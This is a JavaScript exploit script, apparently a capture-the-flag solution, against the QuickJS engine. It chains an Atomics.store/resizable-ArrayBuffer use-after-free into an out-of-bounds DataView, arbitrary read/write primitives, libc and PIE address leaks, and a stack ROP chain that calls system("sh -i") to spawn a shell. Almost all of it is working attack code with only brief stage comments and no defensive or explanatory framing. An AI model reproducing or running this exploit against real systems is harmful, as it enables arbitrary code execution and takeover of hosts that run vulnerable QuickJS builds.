// QuickJS Atomics + Resizable ArrayBuffer stale-pointer bug -> OOB -> libc+PIE leaks -> stack ROP

// ----------------- Helpers -----------------
function u32(x) { return x >>> 0; }

// ----------------- Stage 1: create OOB DataView via Atomics.store -----------------
// Critical: RAB byteLength=56 so the freed old backing store chunk is re-used for JSArrayBuffer (malloc(56)),
// and not for JSObject-sized allocations.
let rab = new ArrayBuffer(56, { maxByteLength: 0x4000 });
let guard = new ArrayBuffer(0x1000);
let ta = new Int32Array(rab);
let victim_ab;

let evil = {
  valueOf() {
    rab.resize(0x2000);          // realloc -> frees old 56-byte chunk
    victim_ab = new ArrayBuffer(0x20); // allocate JSArrayBuffer struct from freed chunk
    return 0x7fffffff;           // overwrite victim_ab->byte_length
  }
};

Atomics.store(ta, 0, evil);
let oob = new DataView(victim_ab);

// ----------------- Stage 2: locate rw_ab's JSArrayBuffer struct in OOB range -----------------
const RW_LEN = 0x1337;
let rw_ab = new ArrayBuffer(RW_LEN);

function find_abuf_struct(target_len) {
  const MAX = 0x80000;
  for (let base = 0; base < MAX; base += 8) {
    // array_list is a list_head at offset 0x18. If empty: next==prev==&array_list.
    let a = oob.getBigUint64(base + 0x18, true);
    let b = oob.getBigUint64(base + 0x20, true);
    if (a !== b) continue;

    let bl = oob.getUint32(base + 0x00, true);
    let maxl = oob.getUint32(base + 0x04, true);
    let det = oob.getUint8(base + 0x08);
    let sh = oob.getUint8(base + 0x09);

    if (bl === target_len && maxl === 0xffffffff && det === 0 && sh === 0) {
      return {
        base_off: base,
        orig_data_ptr: oob.getBigUint64(base + 0x10, true),
        free_func: oob.getBigUint64(base + 0x30, true),
      };
    }
  }
  throw new Error('find_abuf_struct failed');
}

let rw = find_abuf_struct(RW_LEN);
// make rw_ab virtually huge
oob.setUint32(rw.base_off + 0x00, 0x7fffffff, true);

function set_rw_base(addr) {
  oob.setBigUint64(rw.base_off + 0x10, addr, true);
}

function read64(addr) {
  set_rw_base(addr);
  return new DataView(rw_ab).getBigUint64(0, true);
}

// ----------------- Stage 3: leak libc base via unsorted bin fd pointer -----------------
let big = new ArrayBuffer(0x10000);
let big_guard = new ArrayBuffer(0x10000);
let big_u8 = new Uint8Array(big);
for (let i = 0; i < 8; i++) big_u8[0x20 + i] = 0x41; // marker
big = null;
big_u8 = null;
if (typeof gc === 'function') gc();

let marker = 0x4141414141414141n;
let marker_off = -1;
for (let off = 0; off < 0x200000; off += 8) {
  if (oob.getBigUint64(off, true) === marker) {
    marker_off = off;
    break;
  }
}
if (marker_off < 0) throw new Error('marker not found');

let arena_ptr = oob.getBigUint64(marker_off - 0x20, true);
let libc_base = 0n;
let page = arena_ptr & ~0xfffn;
for (let i = 0; i < 0x3000; i++) {
  let w = read64(page);
  if ((w & 0xffffffffn) === 0x464c457fn) { // "\x7fELF"
    libc_base = page;
    break;
  }
  page -= 0x1000n;
}
if (libc_base === 0n) throw new Error('libc base not found');

// ----------------- Stage 4: leak qjs PIE base from rw_ab->free_func -----------------
let qjs_base = 0n;
let qpage = rw.free_func & ~0xfffn;
for (let i = 0; i < 0x2000; i++) {
  let w = read64(qpage);
  if ((w & 0xffffffffn) === 0x464c457fn) {
    qjs_base = qpage;
    break;
  }
  qpage -= 0x1000n;
}
if (qjs_base === 0n) throw new Error('qjs base not found');

// ----------------- Stage 5: find a *real* return address in eval_buf() and ROP -----------------
// Use libc exported variable program_invocation_name -> argv[0] string pointer on initial stack.
const PROGRAM_INVOCATION_NAME_OFF = 0x1e8378n;
let progname_ptr = read64(libc_base + PROGRAM_INVOCATION_NAME_OFF);
let start_page = progname_ptr & ~0xfffn;

// qjs symbol offsets (from nm):
//   eval_buf  at 0x13b60
//   eval_file at 0x13c60
const EVAL_BUF_OFF = 0x13b60n;
const EVAL_FILE_OFF = 0x13c60n;

function find_ret_slot_for(func_off) {
  let lo = qjs_base + func_off;
  let hi = lo + 0x400n; // within the function body

  // Search a limited number of stack pages below argv strings.
  for (let i = 0; i < 0x400; i++) {
    let p = start_page - BigInt(i) * 0x1000n;
    set_rw_base(p);
    let dv = new DataView(rw_ab);
    for (let off = 0; off < 0x1000; off += 8) {
      let v = dv.getBigUint64(off, true);
      if (v >= lo && v < hi) {
        return { page: p, off: off, rip: v };
      }
    }
  }
  return null;
}

let slot = find_ret_slot_for(EVAL_BUF_OFF);
if (!slot) slot = find_ret_slot_for(EVAL_FILE_OFF);
if (!slot) throw new Error('no suitable return slot');

// Prepare ROP chain on the stack at the chosen return slot.
const POP_RDI_RET = libc_base + 0x2a145n;
const RET_GADGET  = libc_base + 0x2846bn;
const SYSTEM      = libc_base + 0x53110n;

set_rw_base(slot.page);
let stack = new DataView(rw_ab);

let ret_off = slot.off;
let ret_slot = slot.page + BigInt(ret_off);
let cmd_addr = ret_slot + 0x100n;
let cmd_off = Number(cmd_addr - slot.page);

stack.setBigUint64(ret_off + 0,  POP_RDI_RET, true);
stack.setBigUint64(ret_off + 8,  cmd_addr, true);
stack.setBigUint64(ret_off + 16, RET_GADGET, true);
stack.setBigUint64(ret_off + 24, SYSTEM, true);

// Write "sh -i\0" at cmd_addr
let cmd = [0x73,0x68,0x20,0x2d,0x69,0x00];
for (let i = 0; i < cmd.length; i++)
  stack.setUint8(cmd_off + i, cmd[i]);

// Return to C; when the corresponding function returns, we ROP into system("sh -i").
